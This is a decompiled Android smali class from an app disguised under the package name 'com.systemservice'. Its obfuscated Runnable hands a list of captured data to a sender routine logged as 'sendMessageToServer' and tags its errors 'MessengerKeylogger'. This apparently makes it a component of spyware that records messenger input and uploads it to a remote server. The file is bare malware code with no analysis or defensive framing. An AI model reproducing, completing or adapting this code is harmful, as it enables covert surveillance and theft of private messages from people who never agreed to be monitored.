.class Lcom/systemservice/a/c/f/c;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/f/d;->a(Ljava/util/List;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/util/List;

.field final synthetic b:I

.field final synthetic c:Lcom/systemservice/a/c/f/d;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/f/d;Ljava/util/List;I)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/f/c;->c:Lcom/systemservice/a/c/f/d;

    iput-object p2, p0, Lcom/systemservice/a/c/f/c;->a:Ljava/util/List;

    iput p3, p0, Lcom/systemservice/a/c/f/c;->b:I

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    const-string v0, "sendMessageToServer = "

    :try_start_0
    new-instance v1, Lcom/systemservice/a/c/h/j;

    iget-object v2, p0, Lcom/systemservice/a/c/f/c;->c:Lcom/systemservice/a/c/f/d;

    invoke-static {v2}, Lcom/systemservice/a/c/f/d;->a(Lcom/systemservice/a/c/f/d;)Landroid/content/Context;

    move-result-object v2

    const/4 v3, 0x0

    invoke-direct {v1, v2, v3}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    iget-object v2, p0, Lcom/systemservice/a/c/f/c;->c:Lcom/systemservice/a/c/f/d;

    invoke-static {v2}, Lcom/systemservice/a/c/f/d;->a(Lcom/systemservice/a/c/f/d;)Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/systemservice/a/c/f/c;->a:Ljava/util/List;

    invoke-virtual {v1, v2, v3}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v1

    new-instance v2, Lcom/systemservice/a/h/k;

    iget-object v3, p0, Lcom/systemservice/a/c/f/c;->c:Lcom/systemservice/a/c/f/d;

    invoke-static {v3}, Lcom/systemservice/a/c/f/d;->a(Lcom/systemservice/a/c/f/d;)Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    iget-object v3, p0, Lcom/systemservice/a/c/f/c;->a:Ljava/util/List;

    invoke-virtual {v2, v3}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    const-string v2, "sendMessageToServer"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v1, p0, Lcom/systemservice/a/c/f/c;->c:Lcom/systemservice/a/c/f/d;

    iget v2, p0, Lcom/systemservice/a/c/f/c;->b:I

    invoke-static {v1, v2}, Lcom/systemservice/a/c/f/d;->a(Lcom/systemservice/a/c/f/d;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "sendMessageToServer ERROR "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "MessengerKeylogger"

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/f/c;->c:Lcom/systemservice/a/c/f/d;

    invoke-static {v2}, Lcom/systemservice/a/c/f/d;->b(Lcom/systemservice/a/c/f/d;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    :goto_0
    return-void
.end method
